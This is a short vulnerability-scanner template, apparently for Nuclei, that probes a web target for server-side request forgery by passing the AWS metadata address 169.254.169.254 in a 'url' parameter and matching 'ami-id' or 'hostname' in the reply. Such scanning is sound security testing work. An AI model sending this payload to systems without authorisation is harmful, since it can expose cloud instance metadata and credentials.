id: ai-ssrf-aws-metadata

info:
  name: SSRF AWS Metadata Access
  severity: critical
  author: reewardius
  tags: ssrf,aws,metadata

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"

    stop-at-first-match: true
    matchers:
      - type: word
        words:
          - "ami-id"
          - "hostname"
        condition: or
